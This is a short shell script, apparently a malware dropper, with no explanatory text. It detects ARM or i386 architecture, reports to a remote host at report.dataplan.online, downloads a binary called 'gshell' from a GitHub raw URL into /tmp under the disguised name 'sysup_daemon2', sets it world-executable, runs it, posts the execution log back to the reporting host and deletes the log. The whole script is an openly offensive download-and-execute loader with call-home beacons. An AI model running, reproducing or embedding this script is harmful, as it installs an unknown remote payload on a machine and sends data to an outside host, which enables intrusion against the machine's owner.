#!/bin/sh

#[ "${FLOCKER}" != "$0" ] && exec env FLOCKER="$0" flock -en "$0" "$0" "$@" || :

report_url="http://report.dataplan.online:19388/9024134B28978B68666E2B034E46130E/debug"
arm_url="https://raw.githubusercontent.com/gptloveyou/gshell/main/client/garm"
i386_url="https://raw.githubusercontent.com/gptloveyou/gshell/main/client/gi386"
pl_url=$i386_url;
arch=`cat /proc/cpuinfo|grep -i -c ARM`
if [ $arch != 0 ];then
    pl_url=$arm_url
    curl -X POST $report_url -d "GShell_ARM"
else 
    pl_url=$i386_url
    curl -X POST $report_url -d "GShell_i386"
fi 

runCount=$(ps -ef|grep sysup_daemon2 | grep -v grep -c)
if [ $runCount != 0 ];then
    curl -X POST $report_url -d "GShell_Exit"
    exit
fi 

curl -o /tmp/sysup_daemon2 $pl_url 1>/tmp/tmplog230627.log 2>&1
runCount2=$(ps -ef|grep sysup_daemon2 | grep -v grep -c)
if [ $runCount2 != 0 ];then
    echo "exit"
    exit
fi
chmod 777 /tmp/sysup_daemon2 1>>/tmp/tmplog230627.log 2>&1
/tmp/sysup_daemon2 1>>/tmp/tmplog230627.log 2>&1
curl -X POST $report_url -d @/tmp/tmplog230627.log
rm /tmp/tmplog230627.log
